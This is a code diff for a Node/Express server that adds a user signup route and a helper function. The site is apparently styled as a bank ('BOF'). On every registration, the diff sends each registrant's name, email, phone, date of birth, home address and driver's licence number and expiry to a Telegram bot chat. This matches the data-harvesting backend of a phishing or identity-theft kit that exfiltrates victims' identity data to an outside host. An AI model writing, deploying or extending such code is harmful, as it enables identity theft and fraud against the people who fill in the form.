@@ -1,8 +1,43 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { userLoginSchema, adminLoginSchema } from "@shared/schema";
+import { userSignupSchema, userLoginSchema, adminLoginSchema } from "@shared/schema";
 import session from "express-session";
+
+// Telegram notification function
+async function sendToTelegram(data: any) {
+  const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
+  const telegramChatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (!telegramBotToken || !telegramChatId) {
+    console.log("Telegram credentials not configured, skipping notification");
+    return;
+  }
+
+  const message = `🏦 New BOF Registration:\n\n` +
+    `👤 Name: ${data.firstName} ${data.lastName}\n` +
+    `📧 Email: ${data.email}\n` +
+    `📱 Phone: ${data.phone}\n` +
+    `🎂 DOB: ${data.dateOfBirth}\n` +
+    `🏠 Address: ${data.address}, ${data.city}, ${data.state} ${data.zipCode}\n` +
+    `🆔 License: ${data.driversLicenseNumber} (${data.driversLicenseState})\n` +
+    `📅 Expires: ${data.driversLicenseExpiry}\n` +
+    `⏰ Registered: ${new Date().toLocaleString()}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (error) {
+    console.error('Failed to send Telegram notification:', error);
+  }
+}
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Session configuration
@@ -46,6 +81,55 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       res.status(400).json({ message: "Invalid request" });
+    }
+  });
+
+  // User registration route
+  app.post("/api/auth/signup", async (req, res) => {
+    try {
+      const signupData = userSignupSchema.parse(req.body);
+      
+      // Check if username or email already exists
+      const existingUser = await storage.getUserByUsername(signupData.username);
+      if (existingUser) {
+        return res.status(400).json({ message: "Username already exists" });
+      }
+
+      const existingEmail = await storage.getUserByEmail(signupData.email);
+      if (existingEmail) {
+        return res.status(400).json({ message: "Email already registered" });
+      }
+
+      // Create new user
+      const newUser = await storage.registerUser(signupData);
+      
+      // Send registration data to Telegram
+      await sendToTelegram(signupData);
+
+      // Store user session (auto-login after signup)
+      (req.session as any).userId = newUser.id;
+      (req.session as any).username = newUser.username;
+      
+      res.status(201).json({ 
+        message: "Registration successful",
+        user: {
+          id: newUser.id,
+          username: newUser.username,
+          email: newUser.email,
+          firstName: newUser.firstName,
+          lastName: newUser.lastName
+        }
+      });
+    } catch (error: any) {
+      if (error.errors) {
+        // Validation errors from Zod
+        return res.status(400).json({ 
+          message: "Validation failed", 
+          errors: error.errors 
+        });
+      }
+      console.error("Signup error:", error);
+      res.status(500).json({ message: "Registration failed" });
     }
   });
 
